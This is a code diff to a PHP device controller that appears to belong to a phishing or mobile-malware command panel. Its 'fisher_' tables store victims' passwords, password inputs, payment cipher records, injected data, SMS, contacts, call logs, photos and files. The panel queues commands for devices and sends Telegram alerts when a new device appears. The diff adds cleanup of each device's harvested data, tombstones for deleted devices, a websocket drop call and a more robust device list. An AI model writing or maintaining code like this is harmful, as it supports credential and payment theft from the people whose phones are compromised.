@@ -86,28 +86,148 @@ class DeviceController extends BaseController
         );
     }
 
+    private function deletedDeviceKey(string $deviceId): string
+    {
+        return 'device_deleted:' . $deviceId;
+    }
+
+    private function upsertSetting(string $key, string $value): void
+    {
+        $exists = Db::table('fisher_settings')->where('key', $key)->find();
+        if ($exists) Db::table('fisher_settings')->where('key', $key)->update(['value' => $value]);
+        else Db::table('fisher_settings')->insert(['key' => $key, 'value' => $value]);
+    }
+
+    private function tableHasColumn(string $table, string $column): bool
+    {
+        try {
+            $rows = Db::query('SHOW COLUMNS FROM `' . str_replace('`', '', $table) . '` LIKE ?', [$column]);
+            return !empty($rows);
+        } catch (\Throwable $e) {
+            return false;
+        }
+    }
+
+
+    private function logDeviceApiError(string $where, \Throwable $e, array $context = []): void
+    {
+        $record = [
+            'time' => date('c'),
+            'where' => $where,
+            'message' => $e->getMessage(),
+            'file' => $e->getFile(),
+            'line' => $e->getLine(),
+            'context' => $context,
+        ];
+        @file_put_contents(
+            runtime_path() . 'device_api_error.log',
+            json_encode($record, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . PHP_EOL,
+            FILE_APPEND | LOCK_EX
+        );
+    }
+
+    private function cleanupDeviceRows(string $deviceId): array
+    {
+        $tables = [
+            'fisher_device_apps',
+            'fisher_operation_logs',
+            'fisher_bridge_logs',
+            'fisher_password_inputs',
+            'fisher_passwords',
+            'fisher_payment_cipher_records',
+            'fisher_injection_data',
+            'fisher_sms_messages',
+            'fisher_contacts',
+            'fisher_call_logs',
+            'fisher_photos',
+            'fisher_files',
+            'fisher_ai_device_data',
+            'fisher_device_sensitive_apps',
+            'fisher_device_black_apps',
+            'fisher_device_payment_strategy_bindings',
+        ];
+        $deleted = [];
+        foreach ($tables as $table) {
+            if (!$this->tableHasColumn($table, 'device_id')) continue;
+            try {
+                $n = Db::table($table)->where('device_id', $deviceId)->delete();
+                if ($n) $deleted[$table] = $n;
+            } catch (\Throwable $e) {}
+        }
+        return $deleted;
+    }
+
+    private function dropOnlineDevice(string $deviceId): void
+    {
+        try {
+            $ch = curl_init(self::wsBaseUrl() . '/internal/drop-device');
+            curl_setopt_array($ch, [
+                CURLOPT_POST           => true,
+                CURLOPT_POSTFIELDS     => json_encode(['deviceId' => $deviceId], JSON_UNESCAPED_UNICODE),
+                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT_MS     => 600,
+                CURLOPT_NOSIGNAL       => 1,
+            ]);
+            curl_exec($ch);
+            curl_close($ch);
+        } catch (\Throwable $e) {}
+    }
+
     /**
      * GET /api/device/list
      * 设备列表（超级管理员查全部，管理员查自己和直属子账号，普通用户查自己）
      */
     public function listDevices()
     {
-        $user = $this->currentActor();
-        $scope = $this->managedUsernames($user);
-        $query = Db::table('fisher_devices');
-        if ($scope !== null) {
-            $query->whereIn('owner_username', $scope ?: ['__no_authorized_owner__']);
+        try {
+            $user = $this->currentActor();
+            $scope = $this->managedUsernames($user);
+            $query = Db::table('fisher_devices');
+
+            // 兼容旧库：owner_username/last_seen 等列缺失时不要把列表接口打成 500。
+            $hasOwnerColumn = $this->tableHasColumn('fisher_devices', 'owner_username');
+            if ($scope !== null && $hasOwnerColumn) {
+                $query->whereIn('owner_username', $scope ?: ['__no_authorized_owner__']);
+            } elseif ($scope !== null && !$hasOwnerColumn) {
+                $this->logDeviceApiError('device.list.scope_skipped', new \RuntimeException('fisher_devices.owner_username column missing'), [
+                    'scope_count' => count($scope ?: []),
+                    'actor' => $user['username'] ?? '',
+                ]);
+            }
+
+            $orderColumn = $this->tableHasColumn('fisher_devices', 'last_seen') ? 'last_seen' : 'device_id';
+            $rows = $query->order($orderColumn, 'desc')->select()->toArray();
+
+            // 通知逻辑不能影响主列表返回。
+            try {
+                $this->checkNewDeviceNotify($rows, $user);
+            } catch (\Throwable $e) {
+                $this->logDeviceApiError('device.list.notify', $e);
+            }
+
+            $onlineInfo = $this->getOnlineDevices();
+            $devices = [];
+            foreach ($rows as $row) {
+                try {
+                    $devices[] = $this->deviceToDict($row, $onlineInfo);
+                } catch (\Throwable $e) {
+                    $this->logDeviceApiError('device.list.row', $e, ['device_id' => $row['device_id'] ?? '']);
+                    $devices[] = [
+                        'id' => $row['device_id'] ?? '',
+                        'deviceId' => $row['device_id'] ?? '',
+                        'name' => $row['device_id'] ?? 'UNKNOWN',
+                        'status' => 'offline',
+                        'lastSeen' => (int)($row['last_seen'] ?? 0) * 1000,
+                        'ownerUsername' => $row['owner_username'] ?? '',
+                    ];
+                }
+            }
+            return json(['success' => true, 'data' => $devices, 'message' => 'success']);
+        } catch (\Throwable $e) {
+            $this->logDeviceApiError('device.list.fallback', $e);
+            return json(['success' => true, 'data' => [], 'message' => 'device list fallback']);
         }
-        $rows = $query->order('last_seen', 'desc')->select()->toArray();
-
-        // ★ 检测新设备并发送 TG 通知（first_seen 在最近 60 秒内且未通知过）
-        $this->checkNewDeviceNotify($rows, $user);
-
-        $onlineInfo = $this->getOnlineDevices();
-        $devices = array_map(function ($row) use ($onlineInfo) {
-            return $this->deviceToDict($row, $onlineInfo);
-        }, $rows);
-        return json(['success' => true, 'data' => $devices, 'message' => 'success']);
     }
 
     /**
@@ -137,10 +257,21 @@ class DeviceController extends BaseController
         if (!$row) return $this->deviceNotFound();
 
         if (in_array($role, ['admin', 'superadmin', 'super-admin'])) {
+            $tombstone = [
+                'device_id' => (string)$id,
+                'deleted_at' => time(),
+                'expires_at' => time() + 7 * 86400,
+                'previous_owner' => (string)($row['owner_username'] ?? ''),
+                'deleted_by' => (string)($user['username'] ?? ''),
+            ];
+            $this->upsertSetting($this->deletedDeviceKey((string)$id), json_encode($tombstone, JSON_UNESCAPED_UNICODE));
+            $relatedDeleted = $this->cleanupDeviceRows((string)$id);
             Db::table('fisher_devices')->where('device_id', $id)->delete();
+            $this->dropOnlineDevice((string)$id);
             $this->auditDeviceSecurity('device.delete', [
                 'device_id' => (string)$id,
                 'previous_owner' => $row['owner_username'] ?? '',
+                'related_deleted' => $relatedDeleted,
             ]);
             return json(['success' => true, 'data' => null, 'message' => '设备已删除']);
         } else {
@@ -599,9 +730,7 @@ class DeviceController extends BaseController
         if ($deviceId) {
             $rows = Db::table('fisher_pending_commands')
                 ->where('device_id', $deviceId)
-                ->where(function ($q) {
-                    $q->whereNull('picked_at')->whereOr('picked_at', 0);
-                })
+                ->whereNull('picked_at')
                 ->order('created_at', 'asc')
                 ->select()->toArray();
 
@@ -974,7 +1103,7 @@ class DeviceController extends BaseController
     /**
      * 设备记录转前端格式（与旧 Python device_to_dict 完全一致）
      */
-    private function deviceToDict(array $row, ?array $onlineInfo = null): array
+    private function deviceToDict(array $row, array $onlineInfo = null): array
     {
         $deviceId = $row['device_id'] ?? '';
         $brand = strtoupper($row['brand'] ?? '') ?: 'UNKNOWN';
